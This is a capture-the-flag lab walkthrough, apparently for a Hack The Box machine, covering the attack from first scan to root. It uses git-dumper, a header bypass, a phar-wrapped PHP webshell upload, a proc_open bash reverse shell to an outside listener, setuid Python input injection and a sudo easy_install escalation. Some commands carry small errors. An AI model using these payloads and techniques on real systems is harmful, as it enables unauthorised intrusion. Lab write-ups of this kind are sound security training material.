## Reconnaissance
## Nmap Enumeration
- Passing command :
```bash
nmap -sV -sC -vv 10.10.11.177

---MAIN-OUTPUT---
Nmap scan report for 10.10.11.177
Host is up, received reset ttl 63 (0.022s latency).
Scanned at 2025-03-29 11:50:32 EDT for 8s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl7j17X/EWcm1MwzD7sKOFZyTUggWH1RRgwFbAK+B6R28x47OJjQW8VO4tCjTyvqKBzpgg7r98xNEykmvnMr0V9eUhg6zf04GfS/gudDF3Fbr3XnZOsrMmryChQdkMyZQK1HULbqRij1tdHaxbIGbG5CmIxbh69mMwBOlinQINCStytTvZq4btP5xSMd8pyzuZdqw3Z58ORSnJAorhBXAmVa9126OoLx7AzL0aO3lqgWjo/wwd3FmcYxAdOjKFbIRiZK/f7RJHty9P2WhhmZ6mZBSTAvIJ36Kb4Z0NuZ+ztfZCCDEw3z3bVXSVR/cp0Z0186gkZv8w8cp/ZHbtJB/nofzEBEeIK8gZqeFc/hwrySA6yBbSg0FYmXSvUuKgtjTgbZvgog66h+98XUgXheX1YPDcnUU66zcZbGsSM1aw1sMqB1vHhd2LGeY8UeQ1pr+lppDwMgce8DO141tj+ozjJouy19Tkc9BB46FNJ43Jl58CbLPdHUcWeMbjwauMrw0=
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMJ3/md06ho+1RKACqh2T8urLkt1ST6yJ9EXEkuJh0UI/zFcIffzUOeiD2ZHphWyvRDIqm7ikVvNFmigSBUpXI=
|   256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1VZrZbtNuK2LKeBBzfz0gywG4oYxgPl+s5QENjani1
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- IP : 10.10.11.177
- port 80 open http
- Ubuntu
- Apache 2.4.41
- Linux OS (5.x from other search)
## Directory and Subdirectory search
- **dirsearch -u** reveals 
- /dev/ which is a blank page
- **Gobuster subdirectory search** reveals nothing (does reveal if you add domain name in /etc/hosts i think)
- **ffuf subdirectory search reveals dev**
- **NOTE: adding the domain name to /etc/hosts is IMPORTANT for this to work.**
- we filter out size (1131) as we get a response for everything
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://10.10.11.176/ -H 'Host: FUZZ.10.10.11.176' -fs 1131
```
- We find dev.siteisup.htb which when trying to access leads to a **Forbidden** page.
- **dirbuster** reveals 
- /dev/index.php which is also blank
- We once again enumerate gobuster with dev included:
```bash
gobuster dir -u http://siteisup.htb/dev/ dns --wordlist /usr/share/wordlists/dirb/common.txt
```
- common.txt worked better than big.txt here
- **We find a git repo**
- We dump git using git-dumper:
```bash
git-dumper http://siteisup.htb/dev/ updown_repo
cd updown_repo
git log
git checkout <commit_id>
git show <commit_id>
```
- We see some interesting commits
- delete .htpasswd
- **New technique in header to protect our dev vhost**
- **NOTE : With git you can add `-p` to `git log` to see all changes with each commit. For smaller changes it's very easy to look through changes for a repo. Additionally you can do `git log –p -- some/path-or-file.php` to show only the log (and changes) for certain directories or files :)**
- We see index.php
```bash
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
        define("DIRECTACCESS",false);
        $page=$_GET['page'];
        if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
                include($_GET['page'] . ".php");
        }else{
                include("checker.php");
        }
?>
```
- It's an admin page (not what we have seen yet considering the text)
- we see a ?page=admin (?page= can be used)
- Defined direct access to false
- We get the page
- if page doesn't have /bin/usr,home or var or etc
- then it does an include (appends) .php onto the page variable
- Else it includes **checker.php** which is the website we have access to.
- **NOTE : Also has an LFI vulnerability due to :**
```bash
include($_GET['page'] . ".php");
```
- **Will explore this method in the end (Based of IPPSec's video. For now, to test:** 
- capture home dev.siteisup.htb in Burpsuite
- Add the special header
- add this in the as the GET command in the packet
```bash
GET /?page=php://filter/convert.base64-encode/resource=index HTTP/1.1
```
- It should add .php to index
- wew are returned with base64 data of admin panel page (dex.siteisup.htb)
- On seeing checker.php which is called by index.php we find there is a check for file type before uploading:
```bash
# Check if extension is allowed.
        $ext = getExtension($file);
        if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
                die("Extension not allowed!");
        }
```
- When it uploads a file, code first checks if size is less than 10kb . It then has a check for extensions that aren't allowed and then creates a file directory for the upload. Finally, it loops through the sites found in the file, checking if they are up, and then deletes the file from the server.
- There exists a phar:// wrapper which can be used to read compressed php file
- phar is a package format for bundled php files
- We also see a hidden `.htaccess` fiile:
```bash
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```
- We see an interesting header.
- We try to access dev.siteisup.htb with this header using Burp Suite
- it leads us to the admin website where we can upload files
- We can add this to Burp Suite so that our browser uses this header always (passes through Burp Suite with intercept off through our Burp Suite proxy).
- In the Proxy region, we click  the Match and Replace option.
- We add a request header and put this in the header we saw earlier in the Replace field.
-  Special-Dev: only4dev
- When we upload a file, from the code we saw, it creates a folder (named by the md5 hash of the time it was uploaded) in the /uploads/ subdirectory.
- File is inside this folder
## Failed Tests
- When we try to upload our reverse shell, it get's delete (as there is a check in the code)
- tried to upload .php.png to the file and it uploaded but we couldn't read it
- this is where the phar wrapper comes in as it can read compressed php files
- We try a basic php script and save it to a file called info.php :
```bash
<?php system($_REQUEST['cmd']); ?>
```
- We compress the file with zip and name it a filename that is allowed (txt, jpeg etc)
```bash
zip info.zip info.php
mv info.zip info.txt

---OR---
zip info.txt info.php
```
- We find the folder name in the /uploads subdirectory
- We access the page file this url with the phar wrapper:
- http://dev.siteisup.htb/?page=phar://uploads/581c4df416658ccd566630d99a9d7953/info.txt/info
- It fails again
- We also try with the initial reverse shell code we have this way and we find the file but it doesn't execute either.
-------
## Successful test
- We create another basic script using another command without the system command (assuming it could be blocked)
```bash
<?php phpinfo();?>
```
- perform the same steps above
- it does lead us to the php info page
- In the phpinfo() page we search for the disable_functions and copy all the disabled functions. (can see output of the data at the bottom of these notes)
```bash
vi diablefunction
------
Paste disable_functions
Clean output with the following commands:
:%s/,/\r/g # more info about this command at bottom of page "VI search commands"
```
- We see functions like system which explain why only phpinfo() injection works and not the others.
- also fsock commands in php-reverse-shell file of pentestmonkey reverse shell
## Foothold
- We need to find functions not in this list that we can exploit
- **defunct bypass python script**
- But in python2
- can fix script OR
- Can create our own PHP file from the data provided in this script (as what we want is PHP anyway and we can simply focus on that rather than making python do that task for us), the data being:
- all the dangerous functions.
```PHP
<?php
$dangerousfunctions = array ('pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexited','pcntl_wifstopped','pcntl_wifsignaled','pcntl_wifcontinued','pcntl_wexitstatus','pcntl_wtermsig','pcntl_wstopsig','pcntl_signal','pcntl_signal_get_handler','pcntl_signal_dispatch','pcntl_get_last_error','pcntl_strerror','pcntl_sigprocmask','pcntl_sigwaitinfo','pcntl_sigtimedwait','pcntl_exec','pcntl_getpriority','pcntl_setpriority','pcntl_async_signals','error_log','system','exec','shell_exec','popen','proc_open','passthru','link','symlink','syslog','ld','mail','mb_send_mail','imap_open','imap_mail','libvirt_connect','gnupg_init');
// Loop through dangerous functions and print if it is enabled
foreach ($dangerousfunctions as $function){
	if (function_exists($function)){
	echo $function."is enabled.";
	}
}
```
- We zip it and upload the file and access it like before:
			http://dev.siteisup.htb/?page=phar://uploads/c6092d5571f3dc4727d5cb0b3409e164/dangerous.txt/dangerous
- We get an output:
```bash
proc_openis enabled.
```
- Add this to dangerous2.php (consider using github autopilot on VScode to help build code but can also find syntax via : https://stackoverflow.com/questions/6014819/how-to-get-output-of-proc-open from searching "proc_open php in google)
```php
//php execute code with proc_open()
$cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.25/9999 0>&1'"
$descriptorspec = array (
	0 => array ("pipe", "r"),    // stdin is a pipe that the child will read from
	1 => array ("pipe", "w"),    // stdout is a pipe that the child will write to
	2 => array ("pipe", "w")     // stderr is a pipe that the child will write to
);
$process = proc_open ($cmd, $desriptorspec, $pipes);
```
- Upload file and access like earlier while having netcat listening on port
- http://dev.siteisup.htb/?page=phar://uploads/18a22c651e3cbe0b65f5a48093052c76/dangerous2.txt/dangerous2 (OR via burp suite)
- we gain reverse shell as www-data
## Lateral Movement
- Looking around we find we can access /home/developer to find an ELF file and a python test file
- on reading the test file we see two interesting things :
```bash
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```
- There is a space between the print and " so this is python2
- **input** can lead to command execution (should use raw input instead as a fix)
- check is setuid permissions is in the ELF executable 
```bash
stat siteisup
```
- Shows **4**750 so since 4 is there setuid permissions have been set.
- Setuid allows us to execute as owner which is developer for this file
- Execute siteisup
- enter a python command injection
```bash
./siteisup

---INPUT---
__import__('os').system("/bin/bash")
```
- We gain developer shell
- But we can't read user.txt! Why?
- because setuid set us as developer user but we are still www-data in groups and as you see the details of user.txt the owner is root and group is developer
- ssh into it. (copy ssh private key to local machine)
```bash
ssh -i developer@siteisup.htb
```
- we read user.txt
## Privilege Escalation
- **sudo -l reveals a /usr/local/bin/easy_install**
- GTFOBins shows a set of commands to execute if we have sudo privileges for easy_install
- we pass the commands (simply copy pasted, tried to echo the command directly but didn't work)
```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```
- we gain root shell
----
## Alternate method (unintended LFI bypass)
- **PHP filter chain**
- doesn't work cause for the main exploit the output exceeds word limit for a packet but logic is still good
- Explanation and solution:
- https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it
- https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html?highlight=life2rce%20via%20php#lfi2rce-via-php-filters
- https://github.com/synacktiv/php_filter_chain_generator
- the php://temp at the end of the output which we add to our packet always returns something no matter what you append to it  (only temp works)
- we execute the python script with the command
```bash
python3 php_filter_chain_generator.py --chain <?php phpinfo(); ?> lfitest.txt
```
- Copy the text and add it to the GET header when we capture dev.siteisup.htb packet in Burp Suite
- Should show us phpinfo.
- With this same logic we could try to get a reverse shell by passing the required command. (tried didn't work, so the command would need fixes and maybe need to consider the php check of the site too?)
--------
## Vim search commands
- :%s/,/\r/g = comma replace with return in vi
- can be broken down as follows:

| **Command**     | **Description88                                                                         |
| --------------- | --------------------------------------------------------------------------------------- |
| **:%**          | Apply the substitution to all lines in the file.                                        |
| **s/old/new/g** | Substitute old with new, and the g flag makes it apply to all occurrences on each line. |
| **,**           | The target for substitution (a comma in this case).                                     |
| **\r**          | Newline character in Vim (inserts a line break).                                        |
| **g**           | Global flag (replace all commas in each line, not just the first one).                  |


## phpinfo Output data()
- **disable functions**
- |   |   |   |
	|---|---|---||disable_functions|pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen|pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen|
----



